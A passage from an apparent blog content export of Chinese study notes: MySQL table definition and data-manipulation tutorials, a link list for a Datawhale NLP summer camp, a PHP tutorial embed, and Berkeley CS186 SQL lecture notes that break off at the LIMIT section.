class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    gender tinyint unsigned <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;性别，说明：1 男，2 女&#x27;</span>,</span><br><span class="line">    image <span class="type">varchar</span>(<span class="number">300</span>) commment <span class="string">&#x27;图像&#x27;</span>,</span><br><span class="line">    job tinyint unsigned comment <span class="string">&#x27;职位，说明：1 班主任，2 讲师，3 学工主管，4 教研主管&#x27;</span>,</span><br><span class="line">    entrydate <span class="type">date</span> comment <span class="string">&#x27;入职时间&#x27;</span>,</span><br><span class="line">    create_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">    update_time datetime <span class="keyword">not</span> <span class="keyword">null</span> comment <span class="string">&#x27;修改时间&#x27;</span></span><br><span class="line">) comment <span class="string">&#x27;员工表&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>图形化界面创建表结构的步骤
<ol>
<li>在指定操作的数据库上，右键<code>New ==&gt; Table</code></li>
<li>编辑表结构的相关信息</li>
</ol>
</li>
</ul>
<h6 id="设计表流程"><a class="header-anchor" href="#设计表流程">¶</a>设计表流程</h6>
<ul>
<li>阅读页面<strong>原型及需求文档</strong></li>
<li>基于页面原则和需求文档，<strong>确定原型字段</strong>(类型、长度限制、约束)</li>
<li>再增加表设计所需要的<strong>业务基础字段</strong>(id主键、插入时间、修改时间)</li>
</ul>
<blockquote>
<p>说明：</p>
<p>create_time：记录的是当前这条数据插入的时间</p>
<p>update_time：记录当前这条数据最后更新的时间</p>
</blockquote>
<h5 id="查询"><a class="header-anchor" href="#查询">¶</a>查询</h5>
<h6 id="查询当前数据库所有表"><a class="header-anchor" href="#查询当前数据库所有表">¶</a>查询当前数据库所有表</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>
<h6 id="查看指定表结构"><a class="header-anchor" href="#查看指定表结构">¶</a>查看指定表结构</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">desc</span> 表名; <span class="comment">-- 可以查看指定表的字段、字段的类型、是否可以为NULL、是否存在默认值信息等</span></span><br></pre></td></tr></table></figure>
<h6 id="查询指定表的建表语句"><a class="header-anchor" href="#查询指定表的建表语句">¶</a>查询指定表的建表语句</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> 表名;</span><br></pre></td></tr></table></figure>
<h5 id="修改"><a class="header-anchor" href="#修改">¶</a>修改</h5>
<h6 id="添加字段"><a class="header-anchor" href="#添加字段">¶</a>添加字段</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">add</span> 字段名 类型（长度） [comment 注释] [约束];</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：为tb_emp表添加字段qq，字段类型为varchar(11)</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp <span class="keyword">add</span> qq <span class="type">varchar</span>(<span class="number">11</span>) comment <span class="string">&#x27;QQ号码&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>图形化操作：添加字段
<ul>
<li>选择一张表→右键→<code>Modify Table</code></li>
</ul>
</li>
</ul>
<h6 id="修改数据类型"><a class="header-anchor" href="#修改数据类型">¶</a>修改数据类型</h6>
<ul>
<li>两种方式都可以</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 modify 字段名 新数据类型（长度）;</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 change 旧字段名 新字段名 类型(长度) [comment 注释] [约束];</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：修改qq字段的字段类型，将其长度由11修改为13</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp modify qq <span class="type">varchar</span>(<span class="number">13</span>) comment <span class="string">&#x27;QQ号码&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：修改qq字段名为qq_num，字段类型varchar(13)</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp change qq qq_num <span class="type">varchar</span>(<span class="number">13</span>) comment <span class="string">&#x27;QQ号码&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>图形化操作：修改数据类型和字段名</p>
</li>
<li>
<p>右键表名→<code>Modify Table</code>→选择字段双击→可以修改字段名或类型→<code>Execute</code></p>
</li>
</ul>
<h6 id="删除字段"><a class="header-anchor" href="#删除字段">¶</a>删除字段</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> 字段名;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：删除<code>tb_emp</code>表中的<code>qq_num</code>字段</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tb_emp <span class="keyword">drop</span> qq_num;</span><br></pre></td></tr></table></figure>
<ul>
<li>图形化操作：
<ul>
<li><code>Modify Table</code>→选择字段，按<code>-</code>删除→<code>Execute</code></li>
</ul>
</li>
</ul>
<h6 id="修改表名"><a class="header-anchor" href="#修改表名">¶</a>修改表名</h6>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rename <span class="keyword">table</span> 表名 <span class="keyword">to</span> 新表名;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：将当前的<code>tb_emp</code>表的表名修改为<code>emp</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">rename <span class="keyword">table</span> tb_emp <span class="keyword">to</span> emp;</span><br></pre></td></tr></table></figure>
<ul>
<li>图形化操作：修改表名
<ul>
<li>右键某个表→<code>Rename</code>→输入新表名→<code>Refactor</code></li>
</ul>
</li>
</ul>
<h5 id="删除"><a class="header-anchor" href="#删除">¶</a>删除</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> [ if <span class="keyword">exists</span> ] 表名;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>if exists ：只有表名存在时才会删除该表，表名不存在，则不执行删除操作(如果不加该参数项，删除一张不存在的表，执行将会报错)</p>
</blockquote>
<ul>
<li>案例：如果<code>tb_emp</code>表存在，则删除<code>tb_emp</code>表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> tb_emp;  <span class="comment">-- 在删除表时，表中的全部数据也会被删除</span></span><br></pre></td></tr></table></figure>
<ul>
<li>图形化操作：删除表
<ul>
<li>右键某个表→<code>Drop</code>→删除成功</li>
</ul>
</li>
</ul>
<h4 id="数据库操作-DML"><a class="header-anchor" href="#数据库操作-DML">¶</a>数据库操作-DML</h4>
<ul>
<li>Data Manipulation Language(数据操作语言)</li>
<li>用来对数据库中表的数据记录进行<strong>增、删、改</strong>操作</li>
<li>添加数据（INSERT）</li>
<li>修改数据（UPDATE）</li>
<li>删除数据（DELETE）</li>
</ul>
<h5 id="增加（Insert）"><a class="header-anchor" href="#增加（Insert）">¶</a>增加（Insert）</h5>
<ul>
<li>向指定字段添加数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 (字段名<span class="number">1</span>, 字段名<span class="number">2</span>) <span class="keyword">values</span> (值<span class="number">1</span>, 值<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>全部字段添加数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
<ul>
<li>批量添加数据（指定字段）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 (字段名<span class="number">1</span>, 字段名<span class="number">2</span>) <span class="keyword">values</span> (值<span class="number">1</span>, 值<span class="number">2</span>), (值<span class="number">1</span>, 值<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>批量添加数据（全部字段）</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">values</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
<ul>
<li>案例1：向tb_emp表的username、name、gender字段插入数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 因为设计表时create_time, update_time两个字段不能为NULL，所以也要作为要插入的字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(username, name, gender, create_time, update_time) <span class="keyword">values</span> (<span class="string">&#x27;wuji&#x27;</span>, <span class="string">&#x27;张无忌&#x27;</span>, <span class="number">1</span>, now(), now());</span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：向tb_emp表的所有字段插入数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(id, username, password, name, gender, image, job, entrydate, create_time, update_time) <span class="keyword">values</span> (<span class="keyword">null</span>, <span class="string">&#x27;zhirou&#x27;</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;周芷若&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;i.jpg&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;2010-01-01&#x27;</span>, now(), now());</span><br></pre></td></tr></table></figure>
<ul>
<li>案例3：批量向tb_emp表的username、name、gender字段插入数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tb_emp(username, name, gender, create_time, update_time) <span class="keyword">values</span> (<span class="string">&#x27;weifuwang&#x27;</span>, <span class="string">&#x27;韦一笑&#x27;</span>, <span class="number">1</span>, now(), now()), (<span class="string">&#x27;fengzi&#x27;</span>, <span class="string">&#x27;张三疯&#x27;</span>, <span class="number">1</span>, now(), now()); </span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>图形化操作：双击<code>tb_emp</code>表查看数据</p>
</li>
<li>
<p>Insert操作的注意事项：</p>
<ol>
<li>插入数据时，指定的字段顺序需要与值的<strong>顺序是一一对应</strong>的</li>
<li>字符串和日期型数据应该<strong>包含在引号中</strong></li>
<li>插入的<strong>数据大小</strong>，应该在字段的<strong>规定范围</strong>内</li>
</ol>
</li>
</ul>
<h5 id="修改（update）"><a class="header-anchor" href="#修改（update）">¶</a>修改（update）</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名<span class="number">1</span> <span class="operator">=</span> 值<span class="number">1</span>, 字段名<span class="number">2</span> <span class="operator">=</span> 值<span class="number">2</span>, ... [<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure>
<ul>
<li>案例1：将<code>tb_emp</code>表中<code>id</code>为<code>1</code>的员工，姓名<code>name</code>字段更新为’张三’</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_emp <span class="keyword">set</span> name<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span>, update_time<span class="operator">=</span>now() <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：将<code>tb_emp</code>表的所有员工入职日期更新为’2010-01-01’</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> tb_emp <span class="keyword">set</span> entrydate <span class="operator">=</span> <span class="string">&#x27;2010-01-01&#x27;</span>, update_time <span class="operator">=</span> now();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>提示：update语句没有书写where条件，会更新表中的所有数据，点击确认执行</p>
<p>注意事项:</p>
<ol>
<li>修改语句的条件可以有，也可以没有，<strong>【如果没有条件，则会修改整张表的所有数据】</strong></li>
<li>在修改数据时，一般需要同时修改公共字段update_time，将其修改为当前操作时间。</li>
</ol>
</blockquote>
<h5 id="删除（delete）"><a class="header-anchor" href="#删除（delete）">¶</a>删除（delete）</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span> 条件];</span><br></pre></td></tr></table></figure>
<ul>
<li>案例1：删除tb_emp表中id为1的员工</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_emp <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>案例2：删除tb_emp表中的所有员工</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> tb_emp;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意事项:</p>
<p>DELETE 语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据</p>
<p>DELETE 语句不能删除某一个字段的值(可以使用UPDATE，将该字段值置为NULL即可)</p>
<p>当进行删除全部数据操作时，会提示询问是否确认删除所有数据，直接点击Execute即可</p>
</blockquote>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【NLP夏令营】链接留档</title>
    <url>/2024/07/13/CS_Notes/NLP/%E3%80%90NLP%E5%A4%8F%E4%BB%A4%E8%90%A5%E3%80%91%E9%93%BE%E6%8E%A5%E7%95%99%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/FfZvw4QIzibTkQkM6FMcrqCgnce">‌‍‍‬⁠‌⁠⁠﻿⁠‬﻿⁠‍‍⁠‌‌‍⁠‬‌‌⁠⁠⁠活动 ｜ Datawhale AI 夏令营 - 飞书云文档 (feishu.cn)</a></p>
<ul>
<li>两个推荐资料
<ul>
<li><a href="https://datawhaler.feishu.cn/wiki/JcnEwCYO2i0v3FkBizWcLfWanKb">‌‌‌⁠‬﻿‍‌‌‍‬⁠﻿‬‌‌﻿‍﻿⁠﻿‬‍⁠‬Datawhale人工智能培养方案V2.0 - 飞书云文档 (feishu.cn)</a></li>
<li><a href="https://datawhaler.feishu.cn/file/IXdDbOBgIoZbtvxLukqc2432nQd">⁠‌‍‬﻿‍‬﻿‍﻿﻿‌﻿﻿⁠﻿⁠‍﻿‬‌‬‬‬﻿‍﻿﻿‌《数据竞赛入门讲义》.pdf - 飞书云文档 (feishu.cn)</a></li>
</ul>
</li>
<li>比赛地址
<ul>
<li><a href="https://challenge.xfyun.cn/topic/info?type=machine-translation-2024&amp;option=ssgy&amp;ch=dw24_sHJm0e">2024 iFLYTEK A.I.开发者大赛-讯飞开放平台 (xfyun.cn)</a></li>
</ul>
</li>
</ul>
<h3 id="Task-1：跑通baseline并提交，查看得分"><a class="header-anchor" href="#Task-1：跑通baseline并提交，查看得分">¶</a>Task 1：跑通baseline并提交，查看得分</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/TObSwHZdFi2y0XktauWcolpcnyf">‍‌‬⁠﻿‍﻿﻿﻿⁠‬‌﻿‌‍‬‍‬‌﻿‍‌⁠‬‍⁠‌‬‍⁠从零入门NLP竞赛 - 飞书云文档 (feishu.cn)</a>    Task1 操作指南</p>
<p><a href="https://datawhaler.feishu.cn/wiki/FVs2wAVN5iqHMqk5lW2ckfhAncb">‌‌‍⁠‍‬⁠⁠‌‬⁠‍‍‍⁠⁠‬﻿‌⁠⁠‬‍‌﻿‍‍Task1：了解机器翻译 &amp; 理解赛题 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://blog.csdn.net/qq_60489376/article/details/140395962">Datawhale AI夏令营- 讯飞机器翻译挑战赛baseline解析-CSDN博客</a>  助教写的，比较完整的笔记</p>
<h3 id="Task-2：从baseline代码详解入门深度学习"><a class="header-anchor" href="#Task-2：从baseline代码详解入门深度学习">¶</a>Task 2：从baseline代码详解入门深度学习</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/PztLwkofsi95oak2Iercw9hkn2g">‌﻿⁠‍⁠‬⁠﻿‌‍‬‌﻿‬⁠‌‍⁠‍⁠‍‬﻿﻿‌Task2：从baseline代码详解入门深度学习 - 飞书云文档 (feishu.cn)</a></p>
<h3 id="Task-3：基于-Transformer-模型实现在机器翻译任务上的应用"><a class="header-anchor" href="#Task-3：基于-Transformer-模型实现在机器翻译任务上的应用">¶</a>Task 3：基于 Transformer 模型实现在机器翻译任务上的应用</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/OgQWwkYkviPfpwkE1ZmcXwcWnAh">‌﻿‬‌‍‬‬‬⁠‬⁠‍‬⁠﻿﻿‍‬‌‬‌﻿‍‬⁠﻿﻿‬Task3知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p>看完一遍有点懵……ok其实是很懵。。。</p>
<p><a href="https://blog.csdn.net/m0_51879931/article/details/134142492">transformer模型— 20道面试题自我检测_transformer面试题-CSDN博客</a></p>
<h3 id="Task-4：通过代码实践入门大模型处理机器翻译"><a class="header-anchor" href="#Task-4：通过代码实践入门大模型处理机器翻译">¶</a>Task 4：通过代码实践入门大模型处理机器翻译</h3>
<ul>
<li>选修性质</li>
</ul>
<p><a href="https://datawhaler.feishu.cn/wiki/L64jw94HwivDoQkptGccDMCznxc">⁠‍⁠‌‌﻿‌‍﻿‍‌‬⁠‍‌‬﻿⁠⁠‌‬‬⁠⁠⁠Task4知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://datawhalechina.github.io/llm-universe/#/">动手学大模型应用开发 (datawhalechina.github.io)</a></p>
<p><a href="https://github.com/datawhalechina/self-llm/tree/master">datawhalechina/self-llm: 《开源大模型食用指南》基于Linux环境快速部署开源大模型，更适合中国宝宝的部署教程 (github.com)</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>NLP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】整理版教程</title>
    <url>/2024/07/23/CS_Notes/PHP/%E3%80%90PHP%E3%80%91%E6%95%B4%E7%90%86%E7%89%88%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>一份来自w3cschools的PHP教程文档</p>
<h3 id="由此始"><a class="header-anchor" href="#由此始">¶</a>由此始</h3>

	<iframe src="https://www.slideshare.net/slideshow/embed_code/key/sXtNQhrXh8ymV8?hostedIn=slideshare&amp;page=upload" style="width:100%;height:550px" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen> </iframe> <div style="margin-bottom:5px">

</div>]]></content>
      <categories>
        <category>notes</category>
        <category>PHP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL1 Berkeley</title>
    <url>/2024/07/04/CS_Notes/Database/CS186%20SQL1/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-1"><a class="header-anchor" href="#SQL-1">¶</a>SQL 1</h2>
<h3 id="what-is-database"><a class="header-anchor" href="#what-is-database">¶</a>what is database</h3>
<h4 id="一些术语"><a class="header-anchor" href="#一些术语">¶</a>一些术语</h4>
<p><code>Relation/Table</code></p>
<ul>
<li><code>Schema: description(&quot;metadata&quot;)</code></li>
<li><code>Instance: set of data satisfying the schema</code></li>
</ul>
<p><code>Attribute/Column/Field</code></p>
<p><code>Tuple/Record/Row</code></p>
<h4 id="一些注意事项"><a class="header-anchor" href="#一些注意事项">¶</a>一些注意事项</h4>
<ol>
<li>每列的类型都是<code>原子类型(无法再细分的)</code>,因此不会是<code>list</code>或者<code>map</code>那种类型的数据</li>
<li><code>saddress</code> 每一行都要<code>fit the schema</code>  简单说就是三行三列的表中不能插入四列的数据行</li>
<li><code>baddress</code>  每一列的名字不能相同</li>
<li><code>maddress</code>  数据类型只能是原子类型</li>
</ol>
<h3 id="SQL-Language"><a class="header-anchor" href="#SQL-Language">¶</a>SQL Language</h3>
<h4 id="Two-sublanguages"><a class="header-anchor" href="#Two-sublanguages">¶</a>Two sublanguages</h4>
<p><code>DDL</code>-Data Definition Language-Define and modify schema   用于定义和修改数据库架构</p>
<p><code>DML</code>-Data Manipulation Language-Queries can be written intuitively  用于操作实际数据</p>
<h4 id="The-SQL-DDL-Sailors"><a class="header-anchor" href="#The-SQL-DDL-Sailors">¶</a>The SQL DDL: Sailors</h4>
<p>以Sailors为例子，来创建数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Sailors (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	sname <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">	rating <span class="type">INTEGER</span>,</span><br><span class="line">	age <span class="type">FLOAT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>sid</th>
<th>SNAME</th>
<th>RATING</th>
<th>AGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Fred</td>
<td>7</td>
<td>22</td>
</tr>
<tr>
<td>2</td>
<td>Jim</td>
<td>2</td>
<td>39</td>
</tr>
<tr>
<td>3</td>
<td>Nancy</td>
<td>8</td>
<td>27</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Boats (</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	bname <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">	color <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (Bid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>BID</th>
<th>BNAME</th>
<th>COLOR</th>
</tr>
</thead>
<tbody>
<tr>
<td>101</td>
<td>Nina</td>
<td>red</td>
</tr>
<tr>
<td>102</td>
<td>Pinta</td>
<td>blue</td>
</tr>
<tr>
<td>103</td>
<td>Santa Maria</td>
<td>red</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reserves (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	<span class="keyword">day</span> <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, bid, <span class="keyword">day</span>),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid)  <span class="keyword">REFERENCES</span> Sailors;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>sid</th>
<th>bid</th>
<th>day</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9/12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
</tbody>
</table>
<h5 id="Primary-Key-column-s"><a class="header-anchor" href="#Primary-Key-column-s">¶</a>Primary Key column(s)</h5>
<ul>
<li>provide a unique “lookup key” for the relation   提供关系的唯一查找键    sid对于这些键值是唯一的</li>
<li>cannot have any duplicate values  不能有重复的值，主键的值在表中必须是唯一的</li>
<li>can be made up of &gt; 1 column  主键可以由多列组成   由多列组成的话就叫做复合主键（kimi给的例子：如果一个表中存储了多个部门的员工信息，可能需要使用部门ID和员工ID的组合作为主键来确保唯一性 ）</li>
</ul>
<h5 id="Foreign-Key-column-s"><a class="header-anchor" href="#Foreign-Key-column-s">¶</a>Foreign Key column(s)</h5>
<p>Foreign Key column(s)  外键</p>
<p>外键应用另一个表的主键或唯一键</p>
<p>上述外键是<code>Sailors</code>表的指针，即<code>Reserves</code>的<code>sid</code>指向<code>Sailors</code>的<code>sid</code></p>
<ul>
<li>Foreign Key references a table via the primary key of that table  外键通过另一个表的主键来引用另一个表</li>
<li>need not share the name of the referenced primary key    不一定和被引用的主键同名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reserves (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	<span class="keyword">day</span> <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, bid, <span class="keyword">day</span>),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid)  <span class="keyword">REFERENCES</span> Sailors,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (bid)  <span class="keyword">REFERENCES</span> Boats;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h4 id="The-SQL-DML"><a class="header-anchor" href="#The-SQL-DML">¶</a>The SQL DML</h4>
<h5 id="Basic-Single-Table-Queries"><a class="header-anchor" href="#Basic-Single-Table-Queries">¶</a>Basic Single-Table Queries</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>single <span class="keyword">table</span><span class="operator">&gt;</span> [<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="SELECT-DISTINCT"><a class="header-anchor" href="#SELECT-DISTINCT">¶</a>SELECT DISTINCT</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> S.name, S.gpa</span><br><span class="line"><span class="keyword">FROM</span> students (<span class="keyword">AS</span>) S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>DISTINCT specifies removal of duplicate rows before output  DISTINCT 在输出前会移除重复行，如果查询结果有多行相同数据，DISTINCT 会保证这些重复行只被显示一次</li>
<li>Can refer to the students table as “S”, this is called an alias   把学生列表记作S，S是其别名，可以简化查询，提高可读性  定义别名的AS可省略</li>
</ul>
<h5 id="ORDER-BY"><a class="header-anchor" href="#ORDER-BY">¶</a>ORDER BY</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa, S.name, A2</span><br></pre></td></tr></table></figure>
<ul>
<li>将两倍年龄别名为A2</li>
<li>ORDER BY clause specifies output to be sorted-Lexicographic ordering   按照字典序排序输出</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa <span class="keyword">DESC</span>, S.name <span class="keyword">ASC</span>, A2</span><br></pre></td></tr></table></figure>
<ul>
<li>DESC  降序  ASC  升序  默认是升序</li>
</ul>
<h5 id="LIMIT"><a class="header-anchor" href="#LIMIT">¶</a>LIMIT</h5>
